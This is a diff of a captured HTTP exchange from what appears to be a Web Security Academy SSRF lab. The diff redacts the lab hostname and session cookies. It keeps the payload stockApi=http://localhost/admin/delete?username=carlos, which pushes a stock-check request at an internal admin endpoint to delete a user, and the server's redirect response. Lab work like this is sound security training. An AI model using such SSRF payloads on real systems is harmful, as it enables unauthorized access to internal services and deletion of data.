@@ -2,8 +2,8 @@
 
 Request
 POST /product/stock HTTP/2
-Host: 0a8e0054035d116e823210b8008e009e.web-security-academy.net
-Cookie: session=5yjQz3ERua31bzfqVW3uFwOHk7ndRLto
+Host: <lab-host>.web-security-academy.net
+Cookie: session=<redacted>
 Content-Length: 54
 Sec-Ch-Ua-Platform: "macOS"
 Accept-Language: en-US,en;q=0.9
@@ -12,11 +12,11 @@ Content-Type: application/x-www-form-urlencoded
 Sec-Ch-Ua-Mobile: ?0
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
 Accept: */*
-Origin: https://0a8e0054035d116e823210b8008e009e.web-security-academy.net
+Origin: https://<lab-host>.web-security-academy.net
 Sec-Fetch-Site: same-origin
 Sec-Fetch-Mode: cors
 Sec-Fetch-Dest: empty
-Referer: https://0a8e0054035d116e823210b8008e009e.web-security-academy.net/product?productId=1
+Referer: https://<lab-host>.web-security-academy.net/product?productId=1
 Accept-Encoding: gzip, deflate, br
 Priority: u=1, i
 
@@ -26,6 +26,6 @@ stockApi=http://localhost/admin/delete?username=carlos
 Response
 HTTP/2 302 Found
 Location: /admin
-Set-Cookie: session=zj1YIsyzPGOXKjX9pNEcrg8NIFt9ccYo; Secure; HttpOnly; SameSite=None
+Set-Cookie: session=<redacted>; Secure; HttpOnly; SameSite=None
 X-Frame-Options: SAMEORIGIN
 Content-Length: 0
